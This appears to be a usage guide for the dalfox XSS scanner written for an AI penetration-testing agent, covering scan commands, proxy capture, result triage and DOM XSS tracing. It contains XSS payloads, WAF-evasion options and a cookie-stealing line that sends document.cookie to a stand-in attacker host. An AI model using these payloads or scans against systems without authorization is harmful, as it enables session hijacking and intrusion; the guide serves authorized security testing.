<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

# dalfox — XSS Scanner Usage Guide for AIRecon

dalfox is a parameter analysis and XSS scanner. It is effective ONLY when pointed at URLs that
already have reflected parameters confirmed through prior enumeration. Running dalfox against a
root URL or a URL with no query parameters is the definition of wasted effort.

---

## MANDATORY PRE-CONDITIONS (All must be true before using dalfox)

  [ ] You have collected URLs with parameters from: katana, waybackurls, gau, historical URL analysis.
      Output should be in output/urls_all_deduped.txt or output/historical_urls.txt.
  [ ] For single-URL mode: you have manually confirmed the parameter reflects user input in the response.
      Test manually first: curl "http://target/search?q=CANARY123" — does CANARY123 appear in response?
  [ ] Caido is running (caido-setup has been executed) so all dalfox traffic is captured.
  [ ] You have a specific hypothesis: which parameter on which endpoint is suspected to be injectable.

Running dalfox without confirmed reflected parameters = noise, not intelligence.

---

## What dalfox Does and Does Not Do

  WHAT IT DOES:
    - Injects XSS payloads into URL parameters and POST body fields
    - Detects reflection and attempts to confirm browser-side execution
    - Identifies DOM-based XSS sources and sinks via headless browser
    - Tests blind XSS with a callback URL (interactsh integration)
    - Supports WAF bypass payload mutation

  WHAT IT DOES NOT DO:
    - Understand application context (what the parameter is used for)
    - Detect stored XSS without a second request to a rendered page
    - Guarantee zero false positives — all "VULN" results require manual browser verification
    - Replace manual analysis of JavaScript source code for DOM XSS sinks

---

## Command Patterns

  PIPE MODE (process URL list from file — most common for recon):
    cat output/xss_candidates.txt | dalfox pipe \
      --proxy http://127.0.0.1:48080 \
      -o output/dalfox_pipe_results.txt

  Generate candidate list from historical URLs with gf first:
    cat output/urls_all_deduped.txt | gf xss | sort -u > output/xss_candidates.txt
    cat output/historical_urls.txt | gf xss | sort -u >> output/xss_candidates.txt
    cat output/xss_candidates.txt | dalfox pipe --proxy http://127.0.0.1:48080 -o output/dalfox_results.txt

  SINGLE URL MODE (after manual confirmation of reflection):
    dalfox url "http://target.com/search?q=test" \
      --proxy http://127.0.0.1:48080 \
      -o output/dalfox_search_q.txt

  WITH AUTHENTICATION (session cookie required):
    dalfox url "http://target.com/profile?name=test" \
      --cookie "session=<value>" \
      --proxy http://127.0.0.1:48080 \
      -o output/dalfox_profile.txt

  POST BODY PARAMETER:
    dalfox url "http://target.com/submit" \
      -X POST \
      --data "username=test&message=hello" \
      --proxy http://127.0.0.1:48080 \
      -o output/dalfox_post.txt

  DOM XSS DISCOVERY (skip BAV — focus on DOM sinks only):
    dalfox url "http://target.com/page?ref=test" \
      --skip-bav \
      --only-discovery \
      --proxy http://127.0.0.1:48080

  BLIND XSS (callback-based, survives stored/out-of-band contexts):
    Requires interactsh-client for callback URL:
      CALLBACK=$(interactsh-client -n 1 2>/dev/null | grep -o '[a-z0-9]*\.oast\.fun' | head -1)
      dalfox url "http://target.com/feedback?msg=test" \
        --blind "$CALLBACK" \
        --proxy http://127.0.0.1:48080 \
        -o output/dalfox_blind.txt
    Then monitor: interactsh-client -n 1 -o output/interactsh_hits.txt

  WAF BYPASS MODE:
    dalfox url "http://target.com/search?q=test" \
      --waf-evasion \
      --proxy http://127.0.0.1:48080 \
      -o output/dalfox_waf.txt

---

## Integration with Caido

  Route ALL dalfox traffic through Caido to capture request/response pairs:
    --proxy http://127.0.0.1:48080

  After dalfox finishes, query Caido history to inspect which payloads triggered responses:
    curl -sL -X POST http://127.0.0.1:48080/graphql \
      -H "Content-Type: application/json" \
      -H "Authorization: Bearer $TOKEN" \
      -d '{"query":"{ requests(filter: {host: {eq: \"target.com\"}, method: {eq: \"GET\"}}) { edges { node { id method path response { statusCode length } } } } }"}'

  Use Caido Replay to manually re-send a promising request with a specific payload:
    1. Find the request ID from history query above
    2. createReplaySession → startReplayTask with modified payload
    3. Inspect response to confirm reflection context

---

## Result Interpretation

  dalfox output levels:

  [I] INFO — Informational: reflected content found, not yet confirmed as XSS
  [W] WEAK — Potential XSS: payload reflected but execution not confirmed
  [V] VULN — Confirmed XSS: payload executed in headless browser context

  FOR EVERY [V] VULN RESULT:
    STEP 1: Note the exact URL and payload dalfox used.
    STEP 2: Manually reproduce with browser_action:
              browser_action(action="goto", url="<the exact VULN url>")
              browser_action(action="get_console_logs", tab_id="main")
    STEP 3: Confirm execution context — what DOM element? What encoding was bypassed?
    STEP 4: Upgrade PoC to impact-demonstrating payload:
              fetch('https://attacker.com?c='+document.cookie) — session hijack
              fetch('/api/admin', {method:'POST'}) — privilege chain
    STEP 5: Document: URL, parameter, payload, context, impact. Call create_vulnerability_report.

  FOR [W] WEAK RESULTS:
    Do not report. Investigate manually: does the payload appear in the response body?
    What context? HTML node, attribute, JS string, URL? Craft a context-specific payload manually.

  FOR FALSE POSITIVES:
    dalfox may flag benign reflections where input is HTML-encoded. Always verify:
      curl "http://target/path?param=<svg onload=alert(1)>" | grep -i "svg\|onload\|alert"
    If output is &lt;svg ... — it is safely encoded. Not a vulnerability.

---

## DOM XSS Manual Analysis Workflow

  When dalfox --only-discovery flags a DOM XSS source:

  STEP 1: Visit the page in the browser:
    browser_action(action="goto", url="http://target.com/page")

  STEP 2: Get page JavaScript source to find sinks:
    browser_action(action="view_source", tab_id="main")
    Look for: innerHTML, outerHTML, document.write, eval, setTimeout with string args,
              location.hash, URLSearchParams, document.referrer flowing to a sink.

  STEP 3: Instrument the page to trace data flow:
    browser_action(action="execute_js", js_code="""
      (function(){
        const orig = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML').set;
        Object.defineProperty(Element.prototype, 'innerHTML', {
          set: function(v) { if(v && v.includes('<')) console.log('[SINK innerHTML]', v.substring(0,100)); return orig.call(this, v); }
        });
      })()
    """, tab_id="main")

  STEP 4: Inject the suspected source (e.g., hash):
    browser_action(action="goto", url="http://target.com/page#<img src=x onerror=alert(1)>")
    browser_action(action="get_console_logs", tab_id="main")
    Look for [SINK innerHTML] in console — confirms the DOM XSS path.

---

## Workflow Integration (Where dalfox Fits)

  Phase 2 (Attack Surface Expansion — URL enumeration complete):
    Run gf xss on collected URLs → dalfox pipe → capture in Caido → manually verify [V] results.

  Phase 3 (Manual Testing — specific parameter identified):
    dalfox single URL mode on confirmed-reflective parameter.
    Always preceded by manual curl reflection check.

  Phase 4 (Vulnerability Confirmation):
    browser_action verification of [V] results.
    Impact-demonstrating PoC crafting.
    create_vulnerability_report only after manual browser confirmation.

  NEVER:
    Run dalfox against a URL with no query parameters.
    Run dalfox against all live hosts blindly.
    Report a [W] WEAK result without manual verification.
    Skip browser_action verification — dalfox headless detection can false-positive.
